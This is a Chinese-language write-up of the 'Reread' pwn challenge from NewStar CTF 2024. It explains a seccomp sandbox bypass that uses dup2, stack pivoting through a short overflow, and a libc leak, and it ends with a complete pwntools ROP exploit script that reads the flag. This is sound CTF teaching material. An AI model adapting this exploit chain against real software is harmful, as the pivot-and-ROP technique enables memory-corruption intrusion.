---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# Reread

先查看沙箱

![查看沙箱](/assets/images/wp/2024/week4/reread_1.png)

可以看到除了只允许open read write dup2四个系统调用外，还增添了一个额外条件

那就是执行read系统调用时，第一个参数必须是0

查看主要函数vuln，直接一个栈溢出贴脸，但是溢出的长度很短，算上rbp的话其实只能覆盖范围地址这一个地方

```c
int vuln()
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  puts("[+] Ok let's try your best!!馃構");
  read(0, buf, 0x50uLL);
  return puts("done!");
}
```

那该怎么办呢

我们来仔细看一下汇编，通过gdb动态调试可以知道，其实是`lea rsi,[rbp]`

然在前面的栈溢出中我们可以控制rbp，如果把返回地址覆盖成4013ac，那我们就可以向任意地址写入0x50字节

同时第二次读入的时候，rbp又是可控的，程序也会执行leave ret，如此，便构成了一次巧妙的栈迁移

```asm
.text:00000000004013AC                 lea     rax, [rbp+buf]
.text:00000000004013B0                 mov     edx, 50h ; 'P'  ; nbytes
.text:00000000004013B5                 mov     rsi, rax        ; buf
.text:00000000004013B8                 mov     edi, 0          ; fd
.text:00000000004013BD                 call    _read
.text:00000000004013C2                 lea     rdi, aDone      ; "done!"
.text:00000000004013C9                 call    _puts
.text:00000000004013CE                 nop
.text:00000000004013CF                 leave
.text:00000000004013D0                 retn
```

至于上文sandbox中设置的syscall_read的一参必须为0的问题，可以使用dup2系统调用

具体用法为dup2(fd,new_fd)，可以看作new_fd是fd的一个拷贝，同时会close(fd)

所以，exp如下

```python
from pwn import *
import sys
from ctypes import *
context.log_level='debug'
context.arch='amd64'
context.terminal = ['tmux','splitw','-h']

libc = ELF('./libc.so.6')
elf = ELF('./pwn')
flag = 1
if flag:
    p = remote('0.0.0.0', 9999)
else:
    p = process("./pwn")

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+"--->"+hex(addr))

reread = 0x4013ac
pop_rdi = 0x0000000000401473
lea_ret = 0x00000000004012ec

payload = b'a'*0x40 + p64(elf.bss(0x800)) + p64(reread)
# gdb.attach(p)
sd(payload)

payload = p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x401394) + b'./flag\x00\x00'
payload = payload.ljust(0x40,b'\x00')
payload += p64(elf.bss(0x7b8)) + p64(lea_ret)
sd(payload)
libc.address = u64(ru(b'\x7f')[-6:].ljust(8,b'\x00')) - libc.sym['puts']
leak("libc", libc.address)

pop_rsi = 0x000000000002601f + libc.address
pop_rdx_r12 = 0x0000000000119431 + libc.address
pop_rax = 0x0000000000036174 + libc.address
syscall = 0x00000000000630a9 + libc.address

payload = b'a'*0x40 + p64(elf.bss(0xa00)) + p64(reread)
sd(payload)

payload = p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(elf.bss(0x9f8)) + p64(pop_rdx_r12) + p64(0x200)*2 + p64(elf.plt['read'])
payload += p64(elf.bss(0x9b8)) + p64(lea_ret)
sd(payload)

orw = flat([
    pop_rdi,elf.bss(0x9f8),
    pop_rsi,0,
    pop_rdx_r12,0,0,
    pop_rax,2,
    syscall,
    pop_rdi,3,
    pop_rsi,0,
    pop_rax,33,
    syscall,
    pop_rdi,0,
    pop_rsi,elf.bss(0x100),
    pop_rdx_r12,0x40,0x40,
    pop_rax,0,
    syscall,
    pop_rdi,1,
    pop_rax,1,
    syscall,
])
sd(b'./flag\x00\x00' + orw.ljust(0x1f8,b'\x00'))
p.interactive()
```
